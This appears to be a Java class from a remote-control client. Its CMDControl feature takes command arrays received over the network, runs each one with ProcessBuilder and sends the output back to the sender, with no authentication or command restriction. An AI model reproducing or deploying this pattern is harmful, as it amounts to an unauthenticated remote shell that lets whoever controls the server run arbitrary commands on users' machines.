package Client.Features;

import Handler.Message;
import Handler.PacketHandler;
import Tools.Network.NetworkInterface;

import java.io.IOException;
import java.io.InputStream;

import static Tools.IConstants.BUFFER_SIZE;
import static Tools.Network.NetworkInterface.Sleep;

public class CMDControl extends Feature {

    private InputStream is;

    private String[] old;

    public CMDControl(PacketHandler packetHandler) {
        super(packetHandler);
    }

    @Override
    public void stopFeature() {
        running = false;
    }

    @Override
    public void startFeature() {
        running = true;
        thread.execute(run());
    }

    @Override
    protected Runnable run() {
        return () -> {
            while (running) {
                try {

                    byte[] buffer = packetHandler.receive(BUFFER_SIZE, packetHandler.getAddress(), packetHandler.getPort());

                    Sleep(1000 / 60);

                    if (buffer.length == 0 || buffer[0] == 0 || buffer[0] != NetworkInterface.CommandByte.CHAT_BYTE)
                        continue;

                    String[] input = (String[]) objectHandler.readModifiedObjects(buffer).get();
                    if (input == null) continue;

                    if(!sameArray(input, old) && !input[0].equals("")){
                        Process p = new ProcessBuilder(input).start();
                        is = p.getInputStream();
                        System.out.println("Process done!");
                        String inputStreamString = new String(is.readAllBytes());
                        System.out.println(inputStreamString);
                        Message<String> response = () -> inputStreamString;
                        byte[] data = objectHandler.writeObjects(response);
                        byte[] dataWithId = objectHandler.writeModifiedArray(data, NetworkInterface.CommandByte.CMDCONTROL_BYTE);
                        packetHandler.send(dataWithId, dataWithId.length, packetHandler.getAddress(), packetHandler.getPort());
                    }
                    old = input;
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        };
    }

    private boolean sameArray(Object[] obj1, Object[] obj2){
        if(obj1 == null || obj2 == null) return false;
        if(obj1.length != obj2.length) return false;
        int counter = 0;
        for(int i = 0; i < obj1.length; i++){
            if(obj1[i].equals(obj2[i])){
                counter++;
            }
        }
        return counter == obj1.length;
    }

    @Override
    public void disposeAll() {
        thread.shutdown();
    }
}
